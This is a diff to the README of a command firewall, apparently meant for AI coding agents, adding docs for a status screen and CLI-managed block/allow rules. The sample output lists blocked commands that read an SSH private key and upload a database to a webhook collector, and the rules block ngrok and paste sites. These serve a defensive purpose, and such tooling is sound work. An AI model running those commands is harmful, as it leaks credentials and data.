@@ -132,11 +132,51 @@ $ airlock uninstall -y
 
 ```bash
 airlock init --profile default   # block the dangerous, stay out of the way
+airlock status                   # one screen: protected? what happened today?
 # ... work normally for a while ...
 airlock allow recent             # what got in your way, most frequent first
 airlock allow last               # permit it, narrowly, in one command
 airlock report                   # what the week looked like
 ```
+
+## See it working — `airlock status`
+
+The firewall shouldn't be a black box. **`airlock status`** is the one command
+that answers "am I protected, and what has it been doing" — in one screen:
+
+```
+  AIRLOCK  ● protected   profile default · mode guard
+  judge: on (airlock-judge.llamafile)    hook: wired
+
+  LAST 24H   41 allowed   3 asked   7 blocked   of 51 decisions
+  recent blocks:
+    ✗ Bash cat ~/.ssh/id_rsa            private-key path off-limits
+    ✗ Bash curl -F @db https://webhook… known exfil collector
+
+  REPORTS   scheduled: every daily   last review: review-20260910-suspicious.md
+```
+
+For live watching there's `airlock monitor`; for the history, `airlock log` /
+`airlock report` / `airlock analyze`.
+
+## Your own rules — `airlock rules` (no YAML)
+
+Add, list and remove rules from the CLI — they are evaluated **before** the
+profile's, so a rule you write wins:
+
+```bash
+airlock rules block '*ngrok*'                 # refuse anything matching
+airlock rules block '*.pastebin.*' --reason 'no paste sites'
+airlock rules allow '*/reports/*' --tool Write
+airlock rules ask '*deploy*'                  # make deploys prompt you
+airlock rules list                            # your rules + a profile summary
+airlock rules rm 2                            # remove your rule #2
+```
+
+Each change backs up the policy and re-validates it — a rule that would not load
+is rolled back. A `block` you add here is absolute (no grant can undo it), the
+same guarantee as a profile block. Prefer whole postures? `airlock profile`
+switches between `default` / `paranoid` / `yolo`.
 
 ## Let Airlock write your policy
 
